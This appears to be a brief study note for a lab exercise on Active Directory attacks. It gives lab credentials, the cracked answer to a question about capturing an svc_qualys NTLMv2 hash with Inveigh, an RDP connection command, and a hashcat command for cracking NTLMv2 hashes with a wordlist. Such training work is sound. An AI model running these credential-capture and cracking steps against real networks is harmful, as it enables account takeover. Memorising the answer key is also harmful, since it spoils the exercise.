
>[!Note] Inveigh
> Same attacks can be conducted from a Windows attack host via the tool [Inveigh](https://github.com/Kevin-Robertson/Inveigh)

# Questions

IP
```go
10.129.34.137
```

Username
 ```go
 htb-student
 ```

Password
```go
Academy_student_AD!
```



1) Run Inveigh and capture the NTLMv2 hash for the svc_qualys account. Crack and submit the cleartext password as the answer.
```go
security#1
```


```go
xfreerdp /v:10.129.34.149 /u:htb-student /p:'Academy_student_AD!' /cert:ignore /drive:Mod13,/home/dan/Desktop/HTB/13-Active-Directory-Enumeration-And-Attacks /size:1600x920
```


```go
hashcat -m 5600 svc_qualys_hash.txt /usr/share/wordlists/rockyou.txt --force -O
```